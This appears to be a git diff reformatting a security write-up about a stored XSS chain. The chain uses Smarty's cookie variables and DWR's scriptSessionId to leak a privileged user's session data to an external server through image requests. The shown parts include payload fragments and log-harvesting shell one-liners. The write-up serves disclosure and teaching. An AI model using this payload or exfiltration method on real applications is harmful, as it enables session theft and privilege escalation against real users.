@@ -30,8 +30,7 @@ After recovering from the realization that I would likely be left shell-less (ju
 2.	Smarty has a built-in PHP reserved variable, "{$smarty}", that can be used to access environment and request variables. One of the variables that "{$smarty}" had access to was "cookies", which as the name indicates allows for Smarty to have access to a users' session cookies via HTTP.
 3.	Smarty “literal” tags.
 ```{literal} tags allow a block of data to be taken literally. This is typically used around Javascript or stylesheet blocks where {curly braces} would interfere with the template delimiter syntax. Anything within {literal}{/literal} tags is not interpreted but displayed as-is.```
-4.	If enabled, a Smarty Debug Console exists
-```{\$smarty.cookies|@debug_print_var}```
+4.	If enabled, a Smarty Debug Console exists ``{\$smarty.cookies|@debug_print_var}``
 -	debug_print_var - formats variable contents for display in the console otherwise using the "{$smarty}" variables causes a popup window to display the desired values.
 ![Smarty Debugging Console Documentation](https://www.smarty.net/docsv2/en/chapter.debugging.console.tpl)
 
@@ -72,14 +71,13 @@ Problem. The scriptSessionId could not be obtained via XSS as it was a value sen
 **Item #3 Solution:**
 
 The scriptSessionId is the DWRSESSIONID concatenated with a "/" and a "_pageId" variable the end user does not know about (DWRSESSIONID + "/" + dwr.engine._pageId). The value that is calculated would be incredibly difficult to guess based on its complexity. The Javascript source showed how this value is calculated in "/dwrS/engine.js" with the following snippet:
-```dwr.engine._pageId = dwr.engine.util.tokenify(new Date().getTime()) + "-" 
-+ dwr.engine.util.tokenify(Math.random() * 1E16);```
+```dwr.engine._pageId = dwr.engine.util.tokenify(new Date().getTime()) + "-" + dwr.engine.util.tokenify(Math.random() * 1E16);```
 
 In order to obtain the scriptSessionId, the application could be used against itself. So the Javascript used to calculate the value must be imported into the final payload ``<script src='/dwrS/engine.js'></script>.`` Next, an XMLHttpRequest (XHR) object must be created to make a secondary request to the server at "/redacted.action". This was done to load the content of this page without having to do a full page refresh. This action will allow access to both the dwr.engine._dwrSessionId + "/" + dwr.engine._pageId variables to be obtained.
 
 With the solution to obtaining all three of the previously mentioned items, the following payload was used to leak each value to an external server using ``new Image().src=`` Javascript references. 
 
-```
+``
 var a = document.getElementById('content-marker');
 var b = a.innerHTML;
 
@@ -114,19 +112,22 @@ var b = a.innerHTML;
    load(url)
 </script>
 {/literal}
-```
+``
 
 So to sum up the vulnerability, using a combination of features from the Smarty template engine and satisfying each requirement from DWR requests via appropriate imports and XHR requests a “medium-ish” privileged user could escalate their privileges to Admin. And problems solved! The final attack is your standard Stored XSS and easy once compared with the creation of the payload:
+
 1.	A ”medium-ish” privileged user creates a custom end user login page with the payload show above.
+
 2.	Through complaining about an issue to a more privileged user or via a more malevolent scenario, a high privileged user visits the stored payload stored by the aforementioned “medium-ish” privileged user where their Session data is leaked similar to the following screenshot.
 ![apache-access-log.png]({{site.baseurl}}/assets/media/posts/redacted/apache-access-log.png)
 
 3.	The ”medium-ish” privileged user can then harvest the goods from their logs. Perhaps similar to what is shown below: On the external Apache web server something along the lines of the following could be done to harvest the necessary items:
-```alias urldecode='python -c "import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'```
-```for x in `cut -d ' ' -f7 access.log | cut -d\? -f2`; do urldecode $x;done > these && 
-sed 's/"//g' these | sed 's/ => //g' > sessionvars` && cat sessionvars```
+``alias urldecode='python -c "import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'``
+``for x in `cut -d ' ' -f7 access.log | cut -d\? -f2`; do urldecode $x;done > these && sed 's/"//g' these | sed 's/ => //g' > sessionvars` && cat sessionvars``
+
 4.	Take the output from the console and insert the values in their appropriate positions in the “medium-ish” privileges malicious HTTP requests.
 ![sessionvars.png]({{site.baseurl}}/assets/media/posts/redacted/sessionvars.png)
+
 5.	And now using our “sessionvars” we can make privileged requests as an exploited user’s  privilege level. Here’s to hoping for full Admin privileges!
 
 Unfortunately, while the investigation of the issue and resulting payload created were fantastic, alas, the program could not fix the issue based on a product management decision and customer requirements. So we are left with the obvious path of **¯\\_(ツ)_/¯** followed by moving on to the next sploit.
